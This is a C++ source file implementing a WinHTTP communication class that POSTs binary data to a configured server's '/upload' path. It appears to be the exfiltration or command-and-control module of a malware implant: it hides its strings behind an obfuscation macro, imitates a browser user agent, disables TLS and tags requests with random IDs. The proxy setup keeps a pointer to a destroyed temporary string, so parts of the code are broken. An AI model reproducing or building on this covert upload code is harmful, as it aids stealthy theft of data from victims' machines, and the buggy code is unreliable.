// src/communication/HttpComms.cpp
#include "communication/HttpComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "utils/StringUtils.h"
#include "utils/NetworkUtils.h"
#include <vector>
#include <random>
#include <cstdint>
#include <string>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// Obfuscated strings
static const char* OBF_HTTP_COMMS = OBFUSCATE("HttpComms");
static const char* OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

HttpComms::HttpComms(Configuration* config)
    : m_config(config), m_hSession(NULL), m_hConnect(NULL) {}

HttpComms::~HttpComms() {
    Cleanup();
}

bool HttpComms::Initialize() {
    // Convert obfuscated C-string to wide string
    std::wstring userAgent = utils::StringUtils::Utf8ToWide(OBF_USER_AGENT);
    
    DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
    LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
    LPCWSTR proxyBypass = WINHTTP_NO_PROXY_BYPASS;
    
    if (m_config->GetUseProxy()) {
        accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        const char* proxyStr = OBFUSCATE("http://proxy:8080");
        proxyName = utils::StringUtils::Utf8ToWide(proxyStr).c_str();
        // Note: You might need to handle proxy bypass if needed
    }
    
    m_hSession = WinHttpOpen(
        userAgent.c_str(),
        accessType,
        proxyName,
        proxyBypass,
        0
    );

    if (!m_hSession) {
        LOG_ERROR("Failed to initialize WinHTTP session: " + std::to_string(GetLastError()));
        return false;
    }

    // Configure timeouts
    int timeout = m_config->GetTimeout();
    WinHttpSetTimeouts(
        m_hSession,
        timeout,
        timeout,
        timeout,
        timeout
    );

    // Parse server URL
    std::string url = m_config->GetServerUrl();
    
    // Convert to wide string for WinHTTP
    std::wstring wUrl = utils::StringUtils::Utf8ToWide(url);
    
    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;
    urlComp.dwExtraInfoLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
        LOG_ERROR("Failed to parse server URL: " + std::to_string(GetLastError()));
        return false;
    }

    std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);

    // Establish connection
    m_hConnect = WinHttpConnect(
        m_hSession,
        hostName.c_str(),
        urlComp.nPort,
        0
    );

    if (!m_hConnect) {
        LOG_ERROR("Failed to establish HTTP connection: " + std::to_string(GetLastError()));
        return false;
    }

    LOG_INFO("HTTP communication initialized successfully");
    return true;
}

bool HttpComms::SendData(const std::vector<uint8_t>& data) {
    if (!m_hConnect) {
        LOG_ERROR("HTTP connection not initialized");
        return false;
    }

    // Create HTTP request
    HINTERNET hRequest = WinHttpOpenRequest(
        m_hConnect,
        L"POST",
        L"/upload",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0 // Remove WINHTTP_FLAG_SECURE for HTTP
    );

    if (!hRequest) {
        LOG_ERROR("Failed to create HTTP request: " + std::to_string(GetLastError()));
        return false;
    }

    // Add headers
    std::string headers = "Content-Type: application/octet-stream\r\n";
    headers += "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16) + "\r\n";
    
    std::wstring wHeaders = utils::StringUtils::Utf8ToWide(headers);
    
    if (!WinHttpAddRequestHeaders(
        hRequest,
        wHeaders.c_str(),
        static_cast<DWORD>(wHeaders.length()),
        WINHTTP_ADDREQ_FLAG_ADD
    )) {
        LOG_WARN("Failed to add HTTP headers: " + std::to_string(GetLastError()));
    }

    // Send request
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        const_cast<uint8_t*>(data.data()), // Remove const_cast if data is not const
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    )) {
        LOG_ERROR("Failed to send HTTP request: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        LOG_ERROR("Failed to receive HTTP response: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Check response status
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (!WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &statusCode,
        &size,
        WINHTTP_NO_HEADER_INDEX
    )) {
        LOG_ERROR("Failed to query HTTP status: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    bool success = (statusCode >= 200 && statusCode < 300);
    if (!success) {
        LOG_ERROR("HTTP request failed with status: " + std::to_string(statusCode));
    }

    WinHttpCloseHandle(hRequest);
    return success;
}

void HttpComms::Cleanup() {
    if (m_hConnect) {
        WinHttpCloseHandle(m_hConnect);
        m_hConnect = NULL;
    }
    if (m_hSession) {
        WinHttpCloseHandle(m_hSession);
        m_hSession = NULL;
    }
    
    LOG_DEBUG("HTTP communication cleaned up");
}   

bool HttpComms::TestConnection() const {
    return utils::NetworkUtils::CheckInternetConnection();
}

std::vector<uint8_t> HttpComms::ReceiveData() {
    // Implement HTTP data reception if needed
    return std::vector<uint8_t>();
}